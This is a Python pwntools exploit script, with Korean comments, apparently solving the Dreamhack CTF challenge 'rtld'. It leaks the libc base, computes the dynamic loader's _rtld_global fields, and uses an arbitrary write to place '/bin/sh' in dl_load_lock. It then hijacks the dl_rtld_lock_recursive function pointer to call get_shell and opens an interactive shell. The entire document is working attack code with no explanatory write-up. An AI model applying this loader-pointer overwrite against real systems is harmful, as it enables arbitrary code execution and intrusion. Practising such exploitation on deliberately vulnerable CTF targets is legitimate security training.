from pwn import *

p = remote("host3.dreamhack.games", 1245)
libc = ELF('./libc-2.27.so')
ld = ELF('./ld-2.27.so')
e = ELF('./rtld')

#libc_base 구하기
p.recvuntil(b': ')
stdout = int(p.recvuntil(b'\n'), 16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']

#ld_base구하기
ld_base = libc_base + 0x3f1000

#rtld멤버변수 주소 구하기
rtld_global = ld_base + ld.symbols['_rtld_global']
dl_load_lock = rtld_global + 2312
dl_rtld_lock_recursive = rtld_global + 3840

#getshell 주소 구하기
get_shell = e.symbols['get_shell']

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'addr: ', str(dl_load_lock).encode())
p.sendlineafter(b'data: ', str(u64('/bin/sh\x00')).encode())
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'addr: ', str(dl_rtld_lock_recursive).encode())
p.sendlineafter(b'value: ', str(get_shell).encode())
p.sendlineafter(b'> ', b'2')
p.interactive()

